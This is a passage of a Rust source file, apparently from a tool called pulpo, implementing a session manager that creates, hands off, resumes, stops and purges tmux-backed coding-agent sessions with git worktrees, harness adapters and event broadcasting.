use std::collections::HashSet;
use std::path::Path;
use std::sync::Arc;

use anyhow::{Result, anyhow, bail};
use chrono::Utc;
use pulpo_common::api::{CleanupResponse, CreateSessionRequest, HandoffSessionRequest};
use pulpo_common::event::{PulpoEvent, SessionDeletedEvent, SessionEvent};
use pulpo_common::session::{Runtime, Session, SessionStatus, meta, status_reason};
use tokio::sync::broadcast;
use uuid::Uuid;

use crate::backend::Backend;
use crate::harness::{self, HarnessRegistry};
#[cfg(not(coverage))]
use crate::session::utils::create_worktree;
use crate::session::utils::{
    DEFAULT_DAEMON_PORT, DOCKER_RUNTIME_REMOVED, cleanup_harness_dir, exit_dir,
    find_orphan_exit_markers, find_orphan_session_logs, find_orphan_worktree_dirs, has_exit_marker,
    read_exit_code_marker, remove_exit_markers, remove_session_log, session_log_path,
    validate_runtime, validate_session_name, validate_workdir, worktrees_dir, wrap_command,
};
#[cfg(test)]
#[allow(unused_imports)]
use crate::session::utils::{exit_clean_marker_path, exit_code_marker_path};
use crate::store::Store;

pub(crate) use crate::session::utils::cleanup_worktree;
#[cfg(test)]
#[allow(unused_imports)]
pub(crate) use crate::session::utils::{is_shell_command, wrap_command_for_test};

#[derive(Clone)]
pub struct SessionManager {
    backend: Arc<dyn Backend>,
    store: Store,
    default_command: Option<String>,
    event_tx: Option<broadcast::Sender<PulpoEvent>>,
    node_name: String,
    /// Grace period (seconds) after session creation before staleness checks apply.
    /// Prevents race where `is_alive()` returns false before tmux is fully ready.
    stale_grace_secs: i64,
    /// When true, mirror each session's full terminal output to a per-session log
    /// file via `tmux pipe-pane`. Defaults to `false` on a bare `SessionManager::new`
    /// (mainly for tests); the daemon always overrides this via
    /// `with_capture_session_output(config.node.capture_session_output)`, which
    /// defaults to `true` since ADR 0009 — see that config field's own doc comment.
    capture_session_output: bool,
    /// Resolves a session's command line (or explicit harness id) to a
    /// [`crate::harness::HarnessAdapter`]. See `spawn`/resume integration below.
    harness_registry: Arc<HarnessRegistry>,
    /// The daemon's own `[node].port` — threaded into `wrap_command` so it can
    /// export `PULPO_URL=http://127.0.0.1:<port>` into every session, letting
    /// `pulpo hook` find a daemon bound to a non-default port. Defaults to the
    /// CLI's own default port for callers that never set it explicitly (tests,
    /// mainly — `build_app` always calls `with_daemon_port`).
    daemon_port: u16,
}

/// Result of resolving the command and description to launch a session with.
struct ResolvedCommand {
    command: String,
    description: Option<String>,
}

struct SessionCreatePlan {
    session: Session,
    backend_id: String,
    effective_workdir: String,
    final_command: String,
}

/// Prepend `export KEY='value'; ` for each of a [`harness::SpawnPlan`]'s extra env
/// vars to `command`. A no-op when `env` is empty (true for every adapter shipped so
/// far — the field exists for adapters that need to pass something through the
/// environment instead of rewriting flags).
fn apply_extra_env(command: &str, env: &[(String, String)]) -> String {
    use std::fmt::Write;

    if env.is_empty() {
        return command.to_owned();
    }
    let mut exports = String::new();
    for (key, value) in env {
        let _ = write!(exports, "export {key}='{}'; ", value.replace('\'', "'\\''"));
    }
    format!("{exports}{command}")
}

impl SessionManager {
    pub fn new(backend: Arc<dyn Backend>, store: Store, default_command: Option<String>) -> Self {
        Self {
            backend,
            store,
            default_command,
            event_tx: None,
            node_name: String::new(),
            stale_grace_secs: 5,
            capture_session_output: false,
            harness_registry: Arc::new(HarnessRegistry::default()),
            daemon_port: DEFAULT_DAEMON_PORT,
        }
    }

    /// Set the daemon's own `[node].port`, exported into every session as
    /// `PULPO_URL` (see `wrap_command`). Called once at startup with
    /// `config.node.port`.
    #[must_use]
    pub const fn with_daemon_port(mut self, port: u16) -> Self {
        self.daemon_port = port;
        self
    }

    #[cfg(test)]
    #[must_use]
    pub const fn with_no_stale_grace(mut self) -> Self {
        self.stale_grace_secs = 0;
        self
    }

    /// Enable per-session full-output capture (`tmux pipe-pane` → `{id}.log`).
    /// The daemon always calls this with `config.node.capture_session_output`
    /// (`true` by default since ADR 0009).
    #[must_use]
    pub const fn with_capture_session_output(mut self, enabled: bool) -> Self {
        self.capture_session_output = enabled;
        self
    }

    #[must_use]
    pub fn with_event_tx(mut self, tx: broadcast::Sender<PulpoEvent>, node_name: String) -> Self {
        self.event_tx = Some(tx);
        self.node_name = node_name;
        self
    }

    pub fn backend(&self) -> Arc<dyn Backend> {
        self.backend.clone()
    }

    fn emit_event(&self, session: &Session, previous_status: Option<SessionStatus>) {
        if let Some(tx) = &self.event_tx {
            let pr_url = session.meta_str(meta::PR_URL).map(str::to_owned);
            let error_status = session.meta_str(meta::ERROR_STATUS).map(str::to_owned);
            // Deprecated-for-one-release compatibility field (ADR 0009): derived from
            // `status_reason` rather than a separately-written `needs_input` metadata
            // key, which new code no longer writes.
            let needs_input = session
                .status_reason
                .as_deref()
                .and_then(status_reason::needs_input_reason)
                .map(str::to_owned);
            let event = SessionEvent {
                session_id: session.id.to_string(),
                session_name: session.name.clone(),
                status: session.status.to_string(),
                status_reason: session.status_reason.clone(),
                previous_status: previous_status.map(|s| s.to_string()),
                node_name: self.node_name.clone(),
                output_snippet: session.output_snapshot.clone(),
                timestamp: Utc::now().to_rfc3339(),
                git_branch: session.git_branch.clone(),
                git_commit: session.git_commit.clone(),
                git_insertions: session.git_insertions,
                git_deletions: session.git_deletions,
                git_files_changed: session.git_files_changed,
                pr_url,
                error_status,
                needs_input,
                total_input_tokens: session.meta_parsed(meta::TOTAL_INPUT_TOKENS),
                total_output_tokens: session.meta_parsed(meta::TOTAL_OUTPUT_TOKENS),
                session_cost_usd: session.meta_parsed(meta::SESSION_COST_USD),
                exit_code: session.exit_code,
            };
            // Ignore send errors — no subscribers is OK
            let _ = tx.send(PulpoEvent::Session(event));
        }
    }

    /// Resolve the backend session ID for a session.
    /// Uses the stored `backend_session_id` if available, otherwise computes it
    /// from the session name when metadata has not recorded a provider value.
    pub fn resolve_backend_id(&self, session: &Session) -> String {
        session
            .backend_session_id
            .clone()
            .unwrap_or_else(|| self.backend.session_id(&session.name))
    }

    pub async fn create_session(&self, req: CreateSessionRequest) -> Result<Session> {
        let plan = self.build_create_plan(req, None).await?;
        self.execute_create_plan(plan).await
    }

    /// Spawn a new session that inherits a finished session's working context —
    /// its working directory, and its git worktree if it has one. Pulpo never reads
    /// or interprets any artifacts the source session left behind (e.g. a PLAN.md) —
    /// it only guarantees the next command starts in the same place.
    ///
    /// Reuses [`Self::build_create_plan`] (and therefore `wrap_command`, budget
    /// metadata, and idle threshold plumbing) with an adopted worktree instead of
    /// creating a new one, so this is not a parallel code path to `spawn`.
    pub async fn handoff_session(
        &self,
        source_id: &str,
        req: HandoffSessionRequest,
    ) -> Result<Session> {
        let source = self
            .store
            .get_session(source_id)
            .await?
            .ok_or_else(|| anyhow!("session not found: {source_id}"))?;

        let name = match req.name {
            Some(n) => n,
            None => self.next_handoff_name(&source.name).await?,
        };

        let adopt_worktree = match &source.worktree_path {
            Some(path) => {
                if !std::path::Path::new(path).exists() {
                    bail!(
                        "source session's worktree no longer exists on disk: {path} — cannot hand off"
                    );
                }
                let branch = source
                    .worktree_branch
                    .clone()
                    .unwrap_or_else(|| source.name.clone());
                Some((path.clone(), branch))
            }
            None => None,
        };

        let create_req = CreateSessionRequest {
            name,
            workdir: Some(source.workdir.clone()),
            command: req.command,
            description: req.description,
            metadata: None,
            idle_threshold_secs: req.idle_threshold_secs,
            worktree: None,
            worktree_base: None,
            runtime: None,
            term_program: req.term_program,
            budget_cost_usd: req.budget_cost_usd,
        };

        let plan = self.build_create_plan(create_req, adopt_worktree).await?;
        self.execute_create_plan(plan).await
    }

    /// Auto-generate a handoff session name: `{source}-2`, `{source}-3`, ... — the
    /// first suffix that doesn't collide with any existing session name (dead or
    /// alive, matching the CLI's own client-side dedup for the common no-name case).
    /// Falls back to `-100` unconditionally after 99 attempts, mirroring the CLI's
    /// `deduplicate_session_name` fallback.
    async fn next_handoff_name(&self, source_name: &str) -> Result<String> {
        for suffix in 2..=99u32 {
            let candidate = Self::handoff_suffixed_name(source_name, suffix);
            if self.store.get_session(&candidate).await?.is_none() {
                return Ok(candidate);
            }
        }
        Ok(Self::handoff_suffixed_name(source_name, 100))
    }

    /// Build `{source}-{suffix}`, truncating `source` (rather than bailing) so the
    /// result never exceeds the 128-char session-name limit.
    fn handoff_suffixed_name(source_name: &str, suffix: u32) -> String {
        let suffix_str = format!("-{suffix}");
        let max_source_len = 128usize.saturating_sub(suffix_str.len());
        let truncated: String = source_name.chars().take(max_source_len).collect();
        format!("{}{suffix_str}", truncated.trim_end_matches('-'))
    }

    /// Insert, create the backend session, and finalize — the shared tail of
    /// `create_session` and `handoff_session` once a [`SessionCreatePlan`] exists.
    async fn execute_create_plan(&self, mut plan: SessionCreatePlan) -> Result<Session> {
        self.store.insert_session(&plan.session).await?;

        if let Err(error) = self.backend.create_session(
            &plan.backend_id,
            &plan.effective_workdir,
            &plan.final_command,
        ) {
            self.cleanup_failed_create(&plan.session.id).await?;
            return Err(error);
        }

        self.finalize_created_session(&mut plan.session, &plan.backend_id)
            .await?;
        Ok(plan.session)
    }

    #[allow(clippy::too_many_lines)]
    async fn build_create_plan(
        &self,
        req: CreateSessionRequest,
        adopt_worktree: Option<(String, String)>,
    ) -> Result<SessionCreatePlan> {
        // Validate session name: must be kebab-case (lowercase alphanumeric + hyphens).
        // This prevents shell injection via wrap_command where the name is interpolated
        // into a shell string, and matches the documented naming convention.
        validate_session_name(&req.name)?;

        // Resolve command and description: explicit request > configured default > $SHELL.
        let resolved = self.resolve_command(&req);
        let command = resolved.command;
        let description = resolved.description;

        // Default workdir to home dir
        let workdir = req.workdir.unwrap_or_else(|| {
            dirs::home_dir().map_or_else(|| "/tmp".to_owned(), |h| h.to_string_lossy().into_owned())
        });

        // Runtime: request overrides the default (tmux).
        // The docker runtime was removed — reject it wherever it comes from.
        let runtime = req.runtime.unwrap_or_default();
        validate_runtime(runtime)?;
        // `worktree_base` implies worktree isolation even when `worktree` itself is
        // omitted — matches the CLI's own normalization (`pulpo-cli/src/lib.rs`,
        // `--base-branch implies --worktree`), so an API caller that sends only
        // `worktree_base` doesn't silently run the agent in the main checkout.
        let wants_worktree = req.worktree.unwrap_or(false) || req.worktree_base.is_some();
        validate_workdir(&workdir)?;

        // Create a git worktree if requested, or adopt one handed off from another
        // session (`pulpo handoff`) — the directory already exists, so no `git
        // worktree add` runs; the caller has already verified it's still on disk.
        let (effective_workdir, worktree_path, worktree_branch) = if let Some((path, branch)) =
            adopt_worktree
        {
            (path.clone(), Some(path), Some(branch))
        } else if wants_worktree {
            #[cfg(not(coverage))]
            {
                let wt_dir = worktrees_dir(self.store.data_dir());
                let wt_path =
                    create_worktree(&wt_dir, &workdir, &req.name, req.worktree_base.as_deref())?;
                (wt_path.clone(), Some(wt_path), Some(req.name.clone()))
            }
            #[cfg(coverage)]
            {
                (workdir.clone(), None, None)
            }
        } else {
            (workdir.clone(), None, None)
        };

        // Reject duplicate names among live sessions
        if self.store.has_active_session_by_name(&req.name).await? {
            bail!(
                "a session named '{}' is already active — stop it first or use a different name",
                req.name
            );
        }

        let id = Uuid::new_v4();
        let name = req.name.clone();
        let backend_id = self.backend.session_id(&name);

        // Harness adapter: resolve, then rewrite the spawn so the harness reports
        // lifecycle events back to pulpo (a no-op for commands no adapter claims —
        // see `harness::GenericAdapter`). Must run before `wrap_command` wraps the
        // command for the backend.
        let id_str = id.to_string();
        let adapter = self.harness_registry.resolve(&command);
        let harness_ctx = harness::SpawnContext {
            session_id: &id_str,
            session_name: &name,
            workdir: &effective_workdir,
            command: &command,
            data_dir: Path::new(self.store.data_dir()),
        };
        let spawn_plan = adapter.prepare_spawn(&harness_ctx).unwrap_or_else(|error| {
            tracing::warn!(
                session = %name,
                harness = adapter.id(),
                %error,
                "harness adapter failed to prepare spawn; spawning unchanged"
            );
            harness::SpawnPlan::unchanged(&command)
        });
        let harness_id = adapter.id().to_owned();
        let harness_session_id = spawn_plan.harness_session_id.clone();

        let final_command = wrap_command(
            &apply_extra_env(&spawn_plan.command, &spawn_plan.env),
            &id,
            &name,
            req.term_program.as_deref(),
            self.store.data_dir(),
            self.daemon_port,
        );

        // Fold the explicit cost budget into the session metadata so the watchdog can
        // enforce it.
        let mut metadata = req.metadata.unwrap_or_default();
        if let Some(budget) = req.budget_cost_usd {
            metadata.insert(meta::BUDGET_COST_USD.to_owned(), budget.to_string());
        }

        let now = Utc::now();
        let session = Session {
            id,
            name,
            workdir: workdir.clone(),
            command,
            description,
            backend_session_id: Some(backend_id.clone()),
            metadata: Some(metadata),
            idle_threshold_secs: req.idle_threshold_secs,
            worktree_path,
            worktree_branch,
            runtime,
            harness: Some(harness_id),
            harness_session_id,
            created_at: now,
            updated_at: now,
            ..Default::default()
        };

        Ok(SessionCreatePlan {
            session,
            backend_id,
            effective_workdir,
            final_command,
        })
    }

    /// The backend never actually started for this session (`backend.create_session`
    /// failed) — mark it `done`/`stopped` rather than leaving it stuck `starting`
    /// forever. There's no real agent process to have "exited", so `stopped` (not
    /// `exited`) is the honest reason: pulpo aborted the spawn.
    async fn cleanup_failed_create(&self, session_id: &Uuid) -> Result<()> {
        self.store
            .update_session_status(
                &session_id.to_string(),
                SessionStatus::Done,
                Some(status_reason::STOPPED),
            )
            .await?;
        Ok(())
    }

    async fn finalize_created_session(
        &self,
        session: &mut Session,
        backend_id: &str,
    ) -> Result<()> {
        let id = session.id;
        let name = session.name.clone();
        // Query the tmux $N session ID and update if available
        if let Ok(tmux_id) = self.backend.query_backend_id(&name) {
            let _ = self
                .store
                .update_backend_session_id(&id.to_string(), &tmux_id)
                .await;
            session.backend_session_id = Some(tmux_id);
        }

        self.store
            .update_session_status(&id.to_string(), SessionStatus::Working, None)
            .await?;

        // Set up full per-session output capture only when enabled (on by default
        // since ADR 0009 — see `capture_session_output`'s doc comment). `tmux
        // pipe-pane` mirrors every byte the agent prints to disk unboundedly; the
        // watchdog reads the live tail from tmux scrollback for the common case,
        // but `resolve_dead_backend_session` falls back to reading this file's
        // tail for a `done` session's very last lines, which the live tmux capture
        // almost never catches (the pane is already gone by the time anything
        // checks).
        if self.capture_session_output {
            let log_path = session_log_path(self.store.data_dir(), &id.to_string());
            if let Some(parent) = log_path.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let _ = self
                .backend
                .setup_logging(backend_id, &log_path.to_string_lossy());
        }

        // Return the session with updated status (avoids unnecessary re-fetch)
        session.status = SessionStatus::Working;
        session.updated_at = Utc::now();
        self.emit_event(session, Some(SessionStatus::Starting));
        Ok(())
    }

    /// Recreate a session's backend on resume, mirroring `finalize_created_session`'s
    /// pipe-pane setup for a fresh spawn — without this, a resumed session had no
    /// per-session log at all, so `resolve_dead_backend_session`'s `Done`-branch
    /// fallback (reading this file's tail once the live tmux capture comes back
    /// empty, which it almost always does for a session that closed cleanly) had
    /// nothing to read for the *resumed* run. The stale log left over from the
    /// session's previous run is truncated first: `tmux pipe-pane -o 'cat >>
    /// {path}'` appends, so without truncating, the next exit's output snapshot
    /// would be a mix of the resumed run's output and whatever the previous run
    /// left behind.
    fn recreate_backend_session(
        &self,
        session: &Session,
        effective_workdir: &str,
        create_id: &str,
        command: &str,
    ) -> Result<()> {
        let final_command = wrap_command(
            command,
            &session.id,
            &session.name,
            None,
            self.store.data_dir(),
            self.daemon_port,
        );
        self.backend
            .create_session(create_id, effective_workdir, &final_command)?;

        if self.capture_session_output {
            let log_path = session_log_path(self.store.data_dir(), &session.id.to_string());
            if let Some(parent) = log_path.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let _ = std::fs::File::create(&log_path);
            let _ = self
                .backend
                .setup_logging(create_id, &log_path.to_string_lossy());
        }
        Ok(())
    }

    /// Resolve the command to relaunch a session with on resume.
    ///
    /// If the session has a `harness_session_id` and its adapter knows how to resume
    /// (`resume_command`), use that instead of the original command — then run it
    /// through `prepare_spawn` again so hooks are re-injected (a fresh `--settings`
    /// file; `ClaudeAdapter` never re-adds `--session-id` once `--resume` is present).
    ///
    /// When no `harness_session_id` is known at all (a legacy row from before this
    /// session learned its id, or a hook/rollout that never reported one), falls back
    /// to the adapter's `fallback_resume_command` — the harness's own "most recent
    /// conversation here" flag (`claude --continue`, `codex resume --last`, `pi -c`)
    /// — rather than silently replaying the original command as a brand new
    /// conversation. Falls back further still to the plain original command when the
    /// adapter has neither (or the session predates harness adapters entirely).
    ///
    /// Refuses (`Err`) rather than guess when the chosen resume mechanism — the
    /// exact resume (`HarnessAdapter::resume_is_cwd_scoped`) or the fallback
    /// (`HarnessAdapter::fallback_resume_is_cwd_scoped`) — is cwd-scoped and
    /// `effective_workdir` isn't where the harness's conversation actually ran
    /// (`original_resume_workdir`) — the session's worktree was removed,
    /// `effective_resume_workdir` silently substituted the plain `workdir`, and
    /// running e.g. `claude --continue` (or pi's exact `--session-id <id>`) there
    /// would resume/open whatever conversation/session happens to be most recent
    /// *in that other directory*, which has nothing to do with this session.
    async fn resolve_resume_command(
        &self,
        session: &Session,
        effective_workdir: &str,
    ) -> Result<String> {
        let adapter = session
            .harness
            .as_deref()
            .and_then(|id| self.harness_registry.get(id))
            .unwrap_or_else(|| self.harness_registry.resolve(&session.command));

        let exact_resume = session
            .harness_session_id
            .as_deref()
            .and_then(|harness_session_id| {
                adapter.resume_command(&session.command, harness_session_id)
            });

        let original_workdir = Self::original_resume_workdir(session);
        let base_command = if let Some(cmd) = exact_resume {
            if adapter.resume_is_cwd_scoped() && effective_workdir != original_workdir {
                let harness_id = adapter.id();
                let session_name = session.name.as_str();
                bail!(
                    "cannot resume '{session_name}': its original workdir \
                     ({original_workdir}) is gone — {harness_id}'s exact resume \
                     (`--session-id <id>`) is scoped to the directory it runs from, and \
                     running it from the current directory ({effective_workdir}) instead \
                     could silently open or create an unrelated session there; start a new \
                     session instead"
                );
            }
            cmd
        } else if let Some(cmd) = adapter.fallback_resume_command(&session.command) {
            if adapter.fallback_resume_is_cwd_scoped() && effective_workdir != original_workdir {
                let harness_id = adapter.id();
                let session_name = session.name.as_str();
                bail!(
                    "cannot resume '{session_name}': its original workdir \
                     ({original_workdir}) is gone and no {harness_id} session id is known — \
                     {harness_id}'s fallback resume runs from the current directory \
                     ({effective_workdir}) instead and could silently continue an unrelated \
                     conversation there; start a new session instead"
                );
            }
            cmd
        } else {
            session.command.clone()
        };

        let session_id = session.id.to_string();
        let harness_ctx = harness::SpawnContext {
            session_id: &session_id,
            session_name: &session.name,
            workdir: effective_workdir,
            command: &base_command,
            data_dir: Path::new(self.store.data_dir()),
        };
        let spawn_plan = adapter.prepare_spawn(&harness_ctx).unwrap_or_else(|error| {
            tracing::warn!(
                session = %session.name,
                harness = adapter.id(),
                %error,
                "harness adapter failed to prepare resume spawn; using unchanged command"
            );
            harness::SpawnPlan::unchanged(&base_command)
        });

        let _ = self
            .store
            .update_session_harness(
                &session_id,
                adapter.id(),
                spawn_plan.harness_session_id.as_deref(),
            )
            .await;

        Ok(apply_extra_env(&spawn_plan.command, &spawn_plan.env))
    }

    async fn refresh_backend_session_id(&self, session: &Session) {
        if let Ok(tmux_id) = self.backend.query_backend_id(&session.name) {
            let _ = self
                .store
                .update_backend_session_id(&session.id.to_string(), &tmux_id)
                .await;
        }
    }

    /// Transition to a status that never carries a `status_reason` (only ever called
    /// with `Working`, from `resume_session`) — clears any stale reason left over
    /// from the `Done`/`Lost` status being resumed from, in both the DB and the
    /// in-memory `session` (so the event emitted right after reflects it too).
    async fn mark_session_status(
        &self,
        session: &mut Session,
        previous_status: SessionStatus,
        next_status: SessionStatus,
    ) -> Result<()> {
        self.store
            .update_session_status(&session.id.to_string(), next_status, None)
            .await?;
        session.status = next_status;
        session.status_reason = None;
        session.updated_at = Utc::now();
        self.emit_event(session, Some(previous_status));
        Ok(())
    }

    /// `list_sessions`/`list_sessions_filtered`'s lazy dead-backend sweep: resolve
    /// each live-looking session whose backend has actually died, emitting the same
    /// `lifecycle` event `get_session` does for a single session — a `pulpo ls`
    /// (or any other list call) is exactly as valid a discovery point for "this
    /// session just ended" as a single-session GET, and skipping the event here
    /// would silently drop it for a session nobody ever fetches individually.
    async fn mark_stale_in_sessions(&self, sessions: &mut [Session]) {
        for session in sessions {
            match self.check_and_mark_stale(session).await {
                Ok(Some(previous)) => self.emit_event(session, Some(previous)),
                Ok(None) => {}
                #[allow(unused_variables)]
                Err(error) => {
                    coverage_warn!(
                        session = %session.name,
                        %error,
                        "failed to check/mark session stale during list"
                    );
                }
            }
        }
    }

    fn effective_resume_workdir(session: &Session) -> String {
        session
            .worktree_path
            .as_ref()
            .filter(|p| std::path::Path::new(p).exists())
            .cloned()
            .unwrap_or_else(|| session.workdir.clone())
    }

    /// The workdir a harness's own conversation actually ran in — the worktree if
    /// the session used one, else the plain `workdir` — regardless of whether that
    /// worktree still exists on disk. Contrast with [`effective_resume_workdir`],
    /// which silently substitutes `workdir` once the worktree is gone: comparing
    /// the two is exactly how `resolve_resume_command` detects that substitution
    /// happened, to refuse a cwd-scoped fallback resume rather than let it run
    /// somewhere else.
    fn original_resume_workdir(session: &Session) -> &str {
        session
            .worktree_path
            .as_deref()
            .unwrap_or(session.workdir.as_str())
    }

    /// The new tmux session id for a session being resumed (backend already dead) —
    /// always the deterministic id derived from the session's own name, never the
    /// stale `$N` `backend_session_id` (which may reference a tmux session that no
    /// longer exists, e.g. after a daemon restart).
    fn resume_create_id(&self, session: &Session) -> String {
        self.backend.session_id(&session.name)
    }

    /// Clear the harness-heuristic state a previous process run may have left behind,
    /// before recreating the backend on resume/auto-resume: `harness_last_event_at`
    /// and the `needs_input`/`last_summary` metadata keys. Without this, a session
    /// resumed after e.g. `NeedsInput`/`TurnFinished` would keep showing that stale
    /// state — and the watchdog would keep treating its (dead) hooks as still owning
    /// its lifecycle signals — until the newly-spawned process's own hooks fire again.
    /// Best-effort: failures are logged, never propagated (matches the surrounding
    /// resume path's overall best-effort bookkeeping).
    async fn clear_harness_heuristic_state(&self, session: &Session) {
        let session_id = session.id.to_string();
        if let Err(error) = self.store.clear_harness_last_event_at(&session_id).await {
            tracing::warn!(
                session = %session.name,
                %error,
                "failed to clear harness_last_event_at on resume"
            );
        }
        if let Err(error) = self
            .store
            .batch_update_session_metadata(
                &session_id,
                &[],
                &[meta::NEEDS_INPUT, meta::LAST_SUMMARY],
            )
            .await
        {
            tracing::warn!(
                session = %session.name,
                %error,
                "failed to clear needs_input/last_summary metadata on resume"
            );
        }
    }

    async fn restore_session_backend(
        &self,
        session: &Session,
        effective_workdir: &str,
        create_id: &str,
    ) -> Result<()> {
        // `resolve_resume_command` runs FIRST, before any destructive side
        // effects below: it can refuse (`Err`) when the chosen resume
        // mechanism is cwd-scoped and the session's original workdir is gone
        // (see its own doc comment). A refusal must leave the session exactly
        // as it was — a stale exit marker or cleared harness-heuristic state
        // would otherwise persist even though no backend was actually
        // recreated, corrupting the next resume attempt too.
        let command = self
            .resolve_resume_command(session, effective_workdir)
            .await?;

        // `resume_session`/`resume_lost_sessions` reuse the same session id when
        // recreating the backend (unlike `create_session`, which always mints a fresh
        // UUID). Purge any stale `.code`/`.clean` markers left over from a *previous*
        // run of this session id first — otherwise the next watchdog idle-check tick
        // could immediately (and wrongly) treat the freshly-resumed, actively-running
        // session as already finished.
        remove_exit_markers(self.store.data_dir(), &session.id.to_string());
        self.clear_harness_heuristic_state(session).await;
        self.recreate_backend_session(session, effective_workdir, create_id, &command)?;
        self.refresh_backend_session_id(session).await;
        Ok(())
    }

    fn stop_session_backend(&self, session: &Session, backend_id: &str) -> Result<()> {
        if let Err(error) = self.backend.kill_session(backend_id) {
            let name_id = self.backend.session_id(&session.name);
            if name_id != backend_id && self.backend.kill_session(&name_id).is_ok() {
                tracing::info!(
                    session = %session.name,
                    "Killed session by name after stale backend ID failed"
                );
                return Ok(());
            }

            if matches!(session.status, SessionStatus::Lost | SessionStatus::Done) {
                tracing::debug!(
                    session = %session.name,
                    error = %error,
                    "Ignoring kill error for {status} session",
                    status = session.status
                );
                return Ok(());
            }

            bail!("failed to stop session: {error}");
        }

        Ok(())
    }

    /// Transition a session to `done` with reason `stopped` — an explicit `pulpo
    /// stop` (as opposed to a clean agent exit, reason `exited`, or a watchdog
    /// intervention, reason = the intervention code).
    /// Atomic (compare-and-set) counterpart to the plain `mark_session_stopped`
    /// name: only transitions — and only emits the `lifecycle` event — if the
    /// session was still live at the moment of the write. Without this, the
    /// caller's earlier `already_terminal` check (in `stop_session`) leaves a
    /// window between that read and this write where a concurrent
    /// `resolve_dead_backend_session`/intervention could have already resolved
    /// the session, and an unconditional `UPDATE` here would both emit a
    /// duplicate event and overwrite whatever more specific `status_reason`
    /// that concurrent caller had just set with the generic `stopped`.
    ///
    /// Returns whether this call is the one that actually performed the
    /// transition — `stop_session` uses this to detect when it lost that race
    /// (see its own doc comment) and re-reads the session's real status instead
    /// of claiming credit for a stop that didn't happen.
    async fn mark_session_stopped(&self, session: &mut Session) -> Result<bool> {
        let previous = session.status;
        let transitioned = self
            .store
            .transition_to_terminal_if_live(
                &session.id.to_string(),
                SessionStatus::Done,
                Some(status_reason::STOPPED),
                None,
            )
            .await?;
        if !transitioned {
            return Ok(false);
        }
        session.status = SessionStatus::Done;
        session.status_reason = Some(status_reason::STOPPED.to_owned());
        self.emit_event(session, Some(previous));
        Ok(true)
    }

    async fn purge_session(&self, session: &Session) -> Result<()> {
        let session_id = session.id.to_string();
        if let Some(ref wt_path) = session.worktree_path {
            if self.store.worktree_in_use_elsewhere(wt_path, &session_id).await? {
                tracing::debug!(
                    session = %session.name,
                    path = %wt_path,
                    "Skipping worktree cleanup — still referenced by another session"
                );
            } else {
                tracing::info!(
                    session = %session.name,
                    path = %wt_path,
                    "Cleaning up worktree after purge"
                );
                cleanup_worktree(wt_path, &session.workdir);
            }
        }
        remove_session_log(self.store.data_dir(), &session_id);
        remove_exit_markers(self.store.data_dir(), &session_id);
        cleanup_harness_dir(self.store.data_dir(), &session_id);
        self.store.delete_intervention_events(&session_id).await?;
        self.store.delete_session(&session_id).await?;
        self.emit_session_deleted(session);
        Ok(())
    }

    /// Remove a session outright (`DELETE /api/v1/sessions/{id}`, `pulpo rm`):
    /// purge its row, intervention events, exit markers, session log, and harness
    /// dir via [`Self::purge_session`] — the same helper `stop_session(..., purge:
    /// true)` uses.
    ///
    /// `Working`/`Waiting` are resolved first via [`Self::check_and_mark_stale`]
    /// (the same lazy sweep `get_session`/`list_sessions` already apply) — a
    /// session whose agent process actually died must not be refused with a
    /// stale live status just because nothing polled it yet (a 409 for a
    /// dead-but-unlisted session). After that, a session still genuinely
    /// `Working`/`Waiting` may not be removed — stop it first. `Starting` is
    /// allowed only once its backend is confirmed dead — a row stuck there (the
    /// daemon crashed between insert and `finalize_created_session`) is
    /// unreachable by every other path (`check_and_mark_stale` never considers
    /// `Starting`) and would otherwise block its name via
    /// `idx_sessions_live_name` forever; a `Starting` session whose backend is
    /// still alive is legitimately mid-creation and stays refused.
    pub async fn remove_session(&self, id: &str) -> Result<()> {
        let mut session = self
            .store
            .get_session(id)
            .await?
            .ok_or_else(|| anyhow!("session not found: {id}"))?;

        if let Some(previous) = self.check_and_mark_stale(&mut session).await? {
            self.emit_event(&session, Some(previous));
        }

        let removable = match session.status {
            SessionStatus::Working | SessionStatus::Waiting => false,
            SessionStatus::Starting => {
                let backend_id = self.resolve_backend_id(&session);
                !self.backend.is_alive(&backend_id).unwrap_or(false)
            }
            SessionStatus::Done | SessionStatus::Lost => true,
        };

        if !removable {
            bail!(
                "session cannot be removed while status is {} — stop it first",
                session.status
            );
        }

        self.purge_session(&session).await
    }

    fn emit_session_deleted(&self, session: &Session) {
        if let Some(tx) = &self.event_tx {
            let _ = tx.send(PulpoEvent::SessionDeleted(SessionDeletedEvent {
                session_id: session.id.to_string(),
                session_name: session.name.clone(),
                node_name: self.node_name.clone(),
                timestamp: Utc::now().to_rfc3339(),
            }));
        }
    }

    /// Resolve the command to launch a session with: explicit request command takes
    /// precedence, then the configured `default_command`, then `$SHELL` (or `/bin/sh`).
    fn resolve_command(&self, req: &CreateSessionRequest) -> ResolvedCommand {
        // Explicit command takes precedence
        if let Some(ref cmd) = req.command {
            return ResolvedCommand {
                command: cmd.clone(),
                description: req.description.clone(),
            };
        }

        // No explicit command — fall back to default_command from config
        if let Some(ref default_cmd) = self.default_command {
            return ResolvedCommand {
                command: default_cmd.clone(),
                description: req.description.clone(),
            };
        }

        // No fallback available — fall back to $SHELL (or /bin/sh)
        let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_owned());
        ResolvedCommand {
            command: shell,
            description: req.description.clone(),
        }
    }

    pub async fn get_session(&self, id: &str) -> Result<Option<Session>> {
        let session = self.store.get_session(id).await?;
        match session {
            Some(mut s) => {
                if let Some(previous) = self.check_and_mark_stale(&mut s).await? {
                    self.emit_event(&s, Some(previous));
                }
                Ok(Some(s))
            }
            None => Ok(None),
        }
    }

    pub async fn list_sessions(&self) -> Result<Vec<Session>> {
        let mut sessions = self.store.list_sessions().await?;
        self.mark_stale_in_sessions(&mut sessions).await;
        Ok(sessions)
    }

    pub async fn list_sessions_filtered(
        &self,
        query: &pulpo_common::api::ListSessionsQuery,
    ) -> Result<Vec<Session>> {
        let mut sessions = self.store.list_sessions_filtered(query).await?;
        self.mark_stale_in_sessions(&mut sessions).await;
        Ok(sessions)
    }

    /// Check if a running session is still alive; if not, mark it stale.
    /// Returns the session's status *before* the transition when it was marked
    /// stale (so the caller can emit an accurate `previous_status`), `None` when
    /// nothing changed.
    ///
    /// Checks `Working` and `Waiting` sessions — after a reboot, tmux sessions are
    /// gone but DB status may still say `Waiting`. There is no `Ready`-equivalent
    /// case to also watch here anymore (ADR 0009): `wrap_command` no longer keeps a
    /// fallback shell alive after the agent exits, so the backend dies at essentially
